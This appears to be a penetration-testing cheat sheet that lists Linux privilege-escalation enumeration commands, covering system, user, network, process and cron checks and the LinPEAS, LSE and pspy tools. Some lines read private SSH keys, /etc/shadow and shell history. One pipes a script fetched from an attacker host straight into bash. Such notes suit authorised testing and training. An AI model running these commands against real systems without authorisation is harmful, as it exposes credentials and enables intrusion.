title: Linux PrivEsc — Enumeration
html:
Linux PrivEsc — Enumeration

Systematic enumeration of a Linux system to identify privilege escalation vectors. Run everything before hypothesising an attack path.

System Info

# Kernel version and architecture
uname -a
uname -r

# OS release
cat /etc/os-release
cat /etc/issue
cat /etc/*-release

# Hostname
hostname

# Kernel build info
cat /proc/version

# CPU info
nproc
cat /proc/cpuinfo | grep "model name" | head -1

# Disk layout
lsblk
df -h

Current User

# Who am I and what groups
id
whoami
groups

# Full sudo rights
sudo -l

# Environment variables (look for credentials, tokens, paths)
env
printenv

# Current shell history
history
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.sh_history

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys 2>/dev/null
cat ~/.ssh/id_rsa 2>/dev/null

Users & Groups

# All users with login shells
cat /etc/passwd | grep -v nologin | grep -v false

# All users (full)
cat /etc/passwd

# Shadow file (requires root or shadow group)
cat /etc/shadow

# All groups
cat /etc/group

# Users with UID 0 (root equivalents)
awk -F: '($3 == 0) {print}' /etc/passwd

# Users recently logged in
lastlog
last
w
who

# Home directories
ls -la /home/

Network

# IP addresses and interfaces
ip addr
ifconfig 2>/dev/null

# Listening ports (find internal services not exposed externally)
ss -tlnp
netstat -tlnp 2>/dev/null
ss -alnp

# All connections
ss -anp
netstat -ano 2>/dev/null

# Routing table
route -n
ip route

# Hosts file
cat /etc/hosts

# DNS config
cat /etc/resolv.conf

# ARP cache (other hosts on network)
arp -a
ip neigh

Processes

# All running processes
ps aux
ps -ef

# Root processes specifically
ps aux | grep root
ps -ef | grep root

# Process tree
pstree -a

# Processes with open files/network connections
lsof -i
lsof -nP -iTCP -sTCP:LISTEN

# pspy64 - monitor processes without root (catch cron, scripts)
# Upload pspy64 to target, then:
chmod +x pspy64
./pspy64
./pspy64 -pf -i 1000

pspy catches cronjobs and scripts run by other users in real time without requiring root. Watch for 30-60 seconds to capture periodic jobs.

Cron Jobs

# System crontab
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Current user crontab
crontab -l

# Other users' crontabs (if readable)
crontab -l -u root 2>/dev/null
ls -la /var/spool/cron/crontabs/ 2>/dev/null

# Systemd timers (modern cron alternative)
systemctl list-timers --all

Automated Enumeration

LinPEAS

# Download and run (on attacker)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh

# Transfer to target, then run:
chmod +x linpeas.sh
./linpeas.sh 2>&1 | tee /tmp/linpeas_out.txt
./linpeas.sh -a 2>&1 | tee /tmp/linpeas_out.txt   # All checks

# One-liner from attacker (serve via HTTP)
curl http://<lhost>/linpeas.sh | bash

# Serve with Python HTTP server on attacker:
python3 -m http.server 80

LSE (Linux Smart Enumeration)

# Download
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh

# Run with increasing verbosity
bash lse.sh -l 0    # only high-severity findings
bash lse.sh -l 1    # interesting findings
bash lse.sh -l 2    # everything

pspy (process monitor)

# Download pspy64 (for 64-bit systems) from:
# https://github.com/DominicBreuker/pspy/releases

# Run and watch for scheduled tasks
./pspy64
./pspy64 -pf -i 1000   # print commands and filesystem events, 1s interval
./pspy64 -pf -i 500    # faster polling (500ms)

unix-privesc-check

./unix-privesc-check standard 2>/dev/null
./unix-privesc-check detailed 2>/dev/null
excerpt: Systematic Linux privilege escalation enumeration — system info, users, network, processes, cron jobs, and automated tools (LinPEAS, LSE, pspy).
